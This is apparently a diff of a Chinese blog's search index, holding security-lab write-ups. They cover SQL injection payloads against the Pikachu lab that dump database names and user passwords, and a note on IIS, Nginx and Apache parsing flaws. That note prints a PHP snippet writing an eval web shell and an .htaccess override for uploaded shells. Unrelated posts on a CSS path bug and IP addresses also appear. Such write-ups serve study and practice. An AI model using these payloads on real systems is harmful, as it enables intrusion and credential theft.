class="keyword">from</span> users	# 爆内容</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/pikachu/42.png" alt></p>
+<h2 id="3、字符型注入-get"><a href="#3、字符型注入-get" class="headerlink" title="3、字符型注入(get)"></a>3、字符型注入(get)</h2><blockquote>
+<p>字符型注入原理：<br>PHP中接收了参数后在进行拼接SQL语句的时候大概语句是这样的<code>select XXX ’变量名‘</code>，这个就是注入点，传进去的参数都会变成字符串，那么我们构造的SQL语句就无法执行，因此要加一个单引号<code>&#39;</code>以闭合前面的单引号，然后后面加上一个<code>#</code>注释掉后面的单引号，这样我们的语句才能被执行</p>
+<p>比如我们传进去<code>asd&#39; or 1=1 #</code>，传进去后就变成了<code>&#39;asd&#39; or 1=1 #&#39;</code>，可以看到中间的<code>or 1=1</code>并未被单引号包裹，所以它能被识别出并执行，攻击的时候将这个语句改成SQL攻击语句即可</p>
+</blockquote>
+<p>结合字符型注入的原理即可构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vince&#x27; or 1=1 #</span><br><span class="line">&#x27;闭合掉前面的单引号，#注释掉后面的单引号以及其他干扰的的语句</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/pikachu/43.png" alt></p>
+<p>然后进行抓包，和数字型一样的构造爆数据的SQL语句即可</p>
+<h2 id="4、搜索型注入"><a href="#4、搜索型注入" class="headerlink" title="4、搜索型注入"></a>4、搜索型注入</h2><p>先对参数进行测试</p>
+<p><img src="/2022/04/17/pikachu/44.png" alt></p>
+<p>发现和字符型是一样的，直接爆内容就行</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">asd<span class="string">&#x27; order by 3#	# 爆字段列数</span></span><br><span class="line"><span class="string">asd&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="keyword">user</span>()#	# 爆数据库名和用户名</span><br><span class="line">asd<span class="string">&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#	# 爆数据表</span></span><br><span class="line"><span class="string">asd&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#	# 爆字段</span><br><span class="line">asd<span class="string">&#x27; union select 1,database(),group_concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users#	# 爆内容</span></span><br></pre></td></tr></table></figure>
+<h2 id="5、xx型注入"><a href="#5、xx型注入" class="headerlink" title="5、xx型注入"></a>5、xx型注入</h2><p>根据提示的意思，无论是什么类型，只要能够闭合掉前面的符号，就能有机会执行SQL语句</p>
+<p>查看源码知道变量除了被单引号包含还被括号包含了，因此需要闭合两个符号</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">asd<span class="string">&#x27;) order by 3#	# 爆字段列数</span></span><br><span class="line"><span class="string">asd&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="keyword">user</span>()#	# 爆数据库名和用户名</span><br><span class="line">asd<span class="string">&#x27;) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#	# 爆数据表</span></span><br><span class="line"><span class="string">asd&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#	# 爆字段</span><br><span class="line">asd<span class="string">&#x27;) union select 1,database(),group_concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users#	# 爆内容</span></span><br></pre></td></tr></table></figure>
+<h2 id="6、”insert-update”注入（报错注入）"><a href="#6、”insert-update”注入（报错注入）" class="headerlink" title="6、”insert/update”注入（报错注入）"></a>6、”insert/update”注入（报错注入）</h2><blockquote>
+<p>当我们输入的数据导致后端执行SQL语句时发生报错时就可能会出现这种漏洞</p>
+<p>updatexml(1,concat(0x7e,database()),1)：第一个参数指定 xml 文档表的字段名称，第二个参数应该是合法的XPATH路径，如果不是就会引发报错的同时将传进去的参数进行输出，第三个是新的值，第一第二个参数没有用，关键是中间的数值，中间的数值也可以用表达式的形式，函数会把这个表达式执行了然后以报错的形式返回出来，这就是报错注入的原理</p>
+<p>类似的函数还有extractvalue，以及还有floor报错注入</p>
+</blockquote>
+<p>payload</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,database())) and &#x27;</span>	# 爆出数据库名</span><br></pre></td></tr></table></figure>
+<p>因为插入和更新，所以抓取注册或者修改信息的数据包，然后修改即可</p>
+<p><img src="/2022/04/17/pikachu/45.png" alt></p>
+<h2 id="7、”delete”注入-报错注入"><a href="#7、”delete”注入-报错注入" class="headerlink" title="7、”delete”注入(报错注入)"></a>7、”delete”注入(报错注入)</h2><p>在删除的时候进行抓包，然后通过报错注入即可</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()))	# 爆数据库</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/04/17/pikachu/46.png" alt></p>
+<h2 id="8、”http-header”注入"><a href="#8、”http-header”注入" class="headerlink" title="8、”http header”注入"></a>8、”http header”注入</h2>]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -2357,50 +2448,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Failed to load resource</title>
-    <url>/2022/01/10/study-3/</url>
-    <content><![CDATA[<p>最近搭博客想弄一个live2d的人物出来玩，于是去网上尝试了各种办法，眼看着就要成功</p>
-<p>但是 你知道的，<del>没有bug的程序不是一个好程序</del>，不会修bug的程序员不是一个好程序员</p>
-<p>bug们想尽各种办法出现，只为了锻炼我们的能力</p>
-<p><img src="/2022/01/10/study-3/3.jpg" alt></p>
-<p>比如：</p>
-<p><img src="/2022/01/10/study-3/1.png" alt></p>
-<p><img src="/2022/01/10/study-3/2.png" alt></p>
-<p>在我这里他们是同一种错误，只是不同的浏览器而已</p>
-<span id="more"></span>
-<hr>
-<p>我在网上看了无数的文章，参考了无数的方法，都不太行，只能说不是我报错的类型</p>
-<p>看着这些404 not found 我觉得很大可能是路径问题</p>
-<p>加上很多文章也说路径问题</p>
-<p>于是进行了修改：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>更改后：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>有点作用，’ ./ ‘ 表示当前目录，它找得到这个css文件了，但是其他网页怎么办，难不成每个网页都配一个这个文件夹？</p>
-<p>于是我改成绝对路径：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;D:/Blog/themes/next/source/live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>但结果并不良好，还是出现了 Failed to load resource 的报错，于是我找到这个文件发现：</p>
-<p>请求网址变成了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4000/D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
-<p>你说这是什么道理（无奈）</p>
-<hr>
-<p>于是我真的给每一个网页配一份文件，搞了两天，实在没招了</p>
-<p>所以报出这两种错很大可能是路径有错，毕竟亲身经历过</p>
-<hr>
-<p>参考：</p>
-<p><a href="https://ask.csdn.net/questions/755371">https://ask.csdn.net/questions/755371</a></p>
-<p><a href="https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff">https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff</a></p>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>IP地址详解</title>
     <url>/2022/01/09/study/</url>
     <content><![CDATA[<h1 id="0x01-IP（IPv4）"><a href="#0x01-IP（IPv4）" class="headerlink" title="0x01 IP（IPv4）"></a>0x01 IP（IPv4）</h1><p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
@@ -2459,6 +2506,50 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
+]]></content>
+      <categories>
+        <category>基础知识和笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Failed to load resource</title>
+    <url>/2022/01/10/study-3/</url>
+    <content><![CDATA[<p>最近搭博客想弄一个live2d的人物出来玩，于是去网上尝试了各种办法，眼看着就要成功</p>
+<p>但是 你知道的，<del>没有bug的程序不是一个好程序</del>，不会修bug的程序员不是一个好程序员</p>
+<p>bug们想尽各种办法出现，只为了锻炼我们的能力</p>
+<p><img src="/2022/01/10/study-3/3.jpg" alt></p>
+<p>比如：</p>
+<p><img src="/2022/01/10/study-3/1.png" alt></p>
+<p><img src="/2022/01/10/study-3/2.png" alt></p>
+<p>在我这里他们是同一种错误，只是不同的浏览器而已</p>
+<span id="more"></span>
+<hr>
+<p>我在网上看了无数的文章，参考了无数的方法，都不太行，只能说不是我报错的类型</p>
+<p>看着这些404 not found 我觉得很大可能是路径问题</p>
+<p>加上很多文章也说路径问题</p>
+<p>于是进行了修改：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>更改后：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有点作用，’ ./ ‘ 表示当前目录，它找得到这个css文件了，但是其他网页怎么办，难不成每个网页都配一个这个文件夹？</p>
+<p>于是我改成绝对路径：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;D:/Blog/themes/next/source/live2d/live2d/css/live2d.css&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但结果并不良好，还是出现了 Failed to load resource 的报错，于是我找到这个文件发现：</p>
+<p>请求网址变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4000/D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///D:/Blog/themes/next/source/live2d/live2d/css/live2d.css</span><br></pre></td></tr></table></figure>
+<p>你说这是什么道理（无奈）</p>
+<hr>
+<p>于是我真的给每一个网页配一份文件，搞了两天，实在没招了</p>
+<p>所以报出这两种错很大可能是路径有错，毕竟亲身经历过</p>
+<hr>
+<p>参考：</p>
+<p><a href="https://ask.csdn.net/questions/755371">https://ask.csdn.net/questions/755371</a></p>
+<p><a href="https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff">https://qastack.cn/programming/40728554/resource-blocked-due-to-mime-type-mismatch-x-content-type-options-nosniff</a></p>
 ]]></content>
       <categories>
         <category>基础知识和笔记</category>
@@ -2562,60 +2653,6 @@
       </tags>
   </entry>
   <entry>
-    <title>解析漏洞</title>
-    <url>/2022/01/09/upload/</url>
-    <content><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p>
-<ol>
-<li><p><strong>目录解析</strong></p>
-<p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p>
-</li>
-<li><p><strong>文件解析</strong></p>
-<p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p>
-</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure>
-<h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p>
-<h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol>
-<li><p><strong>影响版本</strong>:</p>
-<p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>Nginx在图片中嵌入php代码然后通过访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>
-<p>来执行其中的代码</p>
-</li>
-</ol>
-<h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol>
-<li><p><strong>背景</strong></p>
-<p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
-</li>
-<li><p><strong>简介</strong></p>
-<p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p>
-</li>
-<li><p><strong>利用</strong></p>
-<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p>
-</li>
-</ol>
-<h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol>
-<li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p>
-</li>
-<li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>upload-labs</title>
     <url>/2022/01/27/upload-labs/</url>
     <content><![CDATA[<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01:"></a>Pass-01:</h1><p>查看源代码，不难发现，第一个属于前端<code>js</code>验证，有三种方法</p>
@@ -2689,6 +2726,60 @@
 ]]></content>
       <categories>
         <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解析漏洞</title>
+    <url>/2022/01/09/upload/</url>
+    <content><![CDATA[<h1 id="0x01-IIS5-x-6-0解析漏洞"><a href="#0x01-IIS5-x-6-0解析漏洞" class="headerlink" title="0x01 IIS5.x/6.0解析漏洞"></a>0x01 IIS5.x/6.0解析漏洞</h1><p>IIS6.0解析利用的方法有两种：</p>
+<ol>
+<li><p><strong>目录解析</strong></p>
+<p>在网站下建立文件夹名字为.<strong>asp</strong>、.<strong>asa</strong>的文件夹，其目录内的任何扩展名的文件都别IIS当作asp文件来解析并执行。例如创建目录<strong>pamela.asp</strong>，那么<strong>pamela.asp / 1.jpg</strong>将被当作asp文件来执行。</p>
+</li>
+<li><p><strong>文件解析</strong></p>
+<p>在IIS6.0下，分号后面的不被解析，也就是说pamela.asp;.jpg会被服务器看成是pamela.asp，还有        IIS6.0默认的可执行文件除了asp还包括这三种:</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pamela.asa</span><br><span class="line">pamela.cer</span><br><span class="line">pamela.cdx</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#0x02-IIS7-0-IIS7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞"></a>0x02 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下，上传一个名字为<strong>pamela.jpg</strong>，内容为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval(&amp;_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>的文件，然后访问<strong>pamela.jpg/.php</strong>，在这个目录下就会生成一句话木马<strong>shell.php</strong></p>
+<h1 id="0x03-Nginx-lt-8-03空字节代码执行漏洞"><a href="#0x03-Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="0x03 Nginx&lt;8.03空字节代码执行漏洞"></a>0x03 Nginx&lt;8.03空字节代码执行漏洞</h1><ol>
+<li><p><strong>影响版本</strong>:</p>
+<p>0.5./0.6./0.7&lt;=0.7.65/0.8&lt;=0.8.37</p>
+</li>
+<li><p><strong>简介</strong></p>
+<p>Nginx在图片中嵌入php代码然后通过访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>
+<p>来执行其中的代码</p>
+</li>
+</ol>
+<h1 id="0x04-Apache解析漏洞"><a href="#0x04-Apache解析漏洞" class="headerlink" title="0x04 Apache解析漏洞"></a>0x04 Apache解析漏洞</h1><ol>
+<li><p><strong>背景</strong></p>
+<p>Apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
+</li>
+<li><p><strong>简介</strong></p>
+<p>比如<strong>pamela.php.owf.rar</strong> “<strong>.owf</strong>”和”<strong>.rar</strong>” 这两种后缀是 apache 不可识别解析,apache就会把<strong>pamela.php.owf.rar</strong>解析成 <strong>.php</strong></p>
+</li>
+<li><p><strong>利用</strong></p>
+<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,<strong>pamela.php.rara.jpg.png…</strong>（把你知道的常见后缀都写上）去测试是否是合法后缀</p>
+</li>
+</ol>
+<h1 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h1><ol>
+<li><p>在Windows环境下，<strong>xx.jpg[空格]或xx.jpg</strong> 这两类文件是不允许存在的，若这样命名，Windows会默认去除空格和点，我们可以通过抓包，在文件名后加一个<strong>空格或者点</strong>来绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样也可以getshell</p>
+</li>
+<li><p>如果在apache中 <strong>.htaccess</strong>可被执行，且可被上传，那可以尝试在 .htaccess中写入：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">cimer</span>&quot;&gt;</span> </span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后再上传shell.jpg的木马，这样shell.jpg就可解析为php文件</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
       </categories>
       <tags>
         <tag>web</tag>
